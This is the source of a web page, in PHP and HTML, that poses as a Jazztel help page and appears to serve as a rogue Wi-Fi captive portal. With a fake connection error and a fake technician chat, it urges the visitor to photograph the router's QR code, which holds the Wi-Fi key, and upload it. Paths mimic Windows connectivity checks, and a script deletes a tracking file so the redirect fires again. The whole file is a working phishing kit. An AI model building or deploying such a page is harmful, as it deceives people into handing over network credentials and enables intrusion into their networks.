<?php
// on enlève le fichier vu.txt pour ne pas empécher la redirection sur chrome en cas de nouvelle connexion.
  
$file_pointer = "vu.txt"; 
  
// Use unlink() function to delete a file 
if (!unlink($file_pointer)) { 
    echo ("$file_pointer cannot be deleted due to an error"); 
} 
else { 
    echo (""); 
} 
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html  class="no-js" xmlns="http://www.w3.org/1999/xhtml" xml:lang="es_ES" lang="es_ES">
	<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
	<head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>Ayuda Jazztel</title>
        <link rel="stylesheet" href="/msftconnecttest/jazzcss/jazztel.css" media="screen" type="text/css" />
   </head>
<body>
<img class="idbandeau" src="/msftconnecttest/jazzimg/holalol.png" />
</br>
<p>Error 109: no se puede conectar, para segurar la conexión hay que tomar foto del codigo QR y poder usar lo con los otros dispositivos que quieren conectarse a la red <b>sin tener que entrar la clave wifi para cada uno de ellos.</b>El codigo QR esta atrás del router.</p>
</br>
<img class="idjzt" src="/msftconnecttest/jazzimg/jazztel2.png" />
</br>
<img class="idclave" src="/msftconnecttest/jazzimg/clave.png" />
</br>
</br>
<body>
<br>
<br>		
<p>Usted tiene que apoyar el botón <b>Elegir fichero</b> para tomar foto del codigo QR, <b>no hay que moverse durante la foto.</b>Una vez la foto hecha, apoya <b>Upload.</b>Si no funciona, no se cierra la pantalla para usar la camara foto del móvil y tomar foto del codigo QR.Una vez la foto hecha se elige el fichero dentro la galería para enviar la a la verificación del servidor securizado con <b>Upload.</b></p>
<div class="container">
<div class="row">
<div class="col-md-8">
<form id="form" action="ajaxupload.php" method="post" enctype="multipart/form-data">
<input id="uploadImage" type="file" name="image" />
<div id="preview"><img src="filed.png" /></div><br>
<input class="btn btn-success" type="submit" value="Upload">
</form>
<div id="err"></div>
<hr>
        <br>
        <br>
        <p>Si usted no encuentra el codigo QR se puede ponerse en contacto con un tecnico:</strong> <a href="/msftconnecttest/shout/jazztchat.php" target="_blank"><u>Ayuda en linea</u> ...</a></p>
</br>
</br>
</br>
</br>
</body>
</html>